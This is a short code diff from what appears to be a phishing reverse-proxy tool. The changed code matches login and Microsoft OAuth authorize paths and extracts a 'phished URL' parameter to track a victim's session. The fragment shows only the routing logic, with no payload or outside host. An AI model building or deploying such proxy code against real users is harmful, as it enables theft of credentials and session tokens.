@@ -185,7 +185,7 @@ if (url.startsWith('/organizations/oauth2/v2.0/authorize')) {
     }
             }
     
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
